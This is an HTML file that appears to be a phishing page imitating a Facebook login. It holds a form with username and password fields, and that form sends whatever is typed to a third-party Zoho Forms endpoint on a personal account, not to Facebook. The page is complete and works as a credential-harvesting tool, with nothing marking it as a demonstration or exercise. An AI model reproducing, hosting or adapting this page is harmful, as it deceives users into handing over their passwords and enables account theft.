<!DOCTYPE html>
<html lang="en">
<head>

</head>
<body>
    <header>

    <div class="container">
        <div class="logo">Facebook</div>
       <!-- Change or deletion of the name attributes in the input tag will lead to empty values on record submission-->
    <form action='https://forms.zohopublic.in/nikhil20bce7200/form/FaceBook/formperma/InHaIEyERF00hmN6ZhvGng0bq0roUOSpxVRFMmMHG9I/htmlRecords/submit' name='form' id='form' method='POST' accept-charset='UTF-8' enctype='multipart/form-data'>
    <input type="hidden" name="zf_referrer_name" value=""><!-- To Track referrals , place the referrer name within the " " in the above hidden input field -->

    <input type="hidden" name="zc_gad" value=""><!-- If GCLID is enabled in Zoho CRM Integration, click details of AdWords Ads will be pushed to Zoho CRM -->
    
    Username:<input  type="text" name="SingleLine" value="" fieldType=1 maxlength="255" placeholder="" />
    Userpassword:<input  type="password" name="SingleLine1" value="" fieldType=1 maxlength="255" placeholder="" />
    <button type="submit">Submit</button>
    </form>
    </div>
